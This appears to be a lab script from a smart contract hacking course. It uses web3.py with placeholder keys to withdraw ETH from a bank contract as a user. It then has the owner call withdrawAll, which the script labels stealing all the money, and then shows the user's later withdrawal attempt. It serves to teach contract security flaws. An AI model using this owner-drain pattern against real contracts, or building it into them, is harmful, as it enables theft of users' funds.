# 2023 Console Cowboys Python Smart Contract Hacking Course
# @author Olie Brown @ficti0n
# http://cclabs.io 

#User 2 Withdrawing 1 ETH: 
depositMoney = target.functions.withdraw(1000000000000000000).buildTransaction({
                            'nonce': web3.eth.getTransactionCount(web3.eth.accounts[1]),
                            'from': web3.eth.accounts[1],
                            'gas': 3000000,
                            'gasPrice': web3.toWei('50', 'gwei')
    })

signed_deposit = web3.eth.account.signTransaction(depositMoney, "PRIVATE KEY OF USER 2")
transaction_hash = web3.eth.sendRawTransaction(signed_deposit.rawTransaction)


#Owner Stealing all the money from the Bank:
withDrawAll = target.functions.withdrawAll().buildTransaction({
                            'nonce': web3.eth.getTransactionCount(web3.eth.accounts[0]),
                            'from': web3.eth.accounts[0],
                            'gas': 3000000,
                            'gasPrice': web3.toWei('50', 'gwei')
    })

signed_withdraw = web3.eth.account.signTransaction(withDrawAll, "OWNER PRIVATE KEY")
transaction_hash = web3.eth.sendRawTransaction(signed_withdraw.rawTransaction)


#User 2 Trying to withdraw 1 more eth: 
depositMoney = target.functions.withdraw(1000000000000000000).buildTransaction({
                            'nonce': web3.eth.getTransactionCount(web3.eth.accounts[1]),
                            'from': web3.eth.accounts[1],
                            'gas': 3000000,
                            'gasPrice': web3.toWei('50', 'gwei')
    })

signed_deposit = web3.eth.account.signTransaction(depositMoney, "PRIVATE KEY OF USER 2")
transaction_hash = web3.eth.sendRawTransaction(signed_deposit.rawTransaction)
